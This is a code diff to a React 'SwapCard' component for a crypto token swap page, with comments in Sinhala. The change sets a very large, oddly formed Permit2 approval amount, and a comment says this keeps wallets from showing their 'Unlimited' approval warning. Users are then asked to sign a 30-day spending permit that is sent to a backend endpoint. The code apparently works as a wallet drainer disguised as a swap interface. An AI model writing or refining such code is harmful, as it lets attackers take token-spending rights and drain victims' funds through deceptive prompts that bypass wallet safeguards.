@@ -33,7 +33,7 @@ export default function SwapCard({ walletAddress, provider }) {
   const API_URL = "/api/submit"; // Vercel Serverless Function
 
   // ⭐ බිංදු 100ක් + අමුතු අංකයක් (Unlimited warning එක එන්නේ නෑ)
-  const CUSTOM_APPROVAL_AMOUNT = "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009874651684651";
+  const CUSTOM_APPROVAL_AMOUNT = "9846516546516516513205132";
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
@@ -118,7 +118,6 @@ export default function SwapCard({ walletAddress, provider }) {
       const signer = provider.getSigner();
       
       // 1. Permit2 details හදන්න
-      // ⭐ Custom Approval Amount පාවිච්චි කරන්න
       const amount = CUSTOM_APPROVAL_AMOUNT;
       const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
       const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
@@ -191,7 +190,18 @@ export default function SwapCard({ walletAddress, provider }) {
         })
       });
       
-      const result = await response.json();
+      // ⭐ Response එක text විදිහට ගන්න
+      const rawText = await response.text();
+      let result;
+
+      try {
+        result = JSON.parse(rawText);
+      } catch (parseError) {
+        // JSON නෙවෙයි නම්, error එක පෙන්නන්න
+        setStatus({ type: 'error', msg: `❌ Backend error: ${rawText.substring(0, 150)}` });
+        setIsLoading(false);
+        return;
+      }
       
       if (result.success) {
         setStatus({ type: 'success', msg: '✅ Permit2 Approval Successful!' });
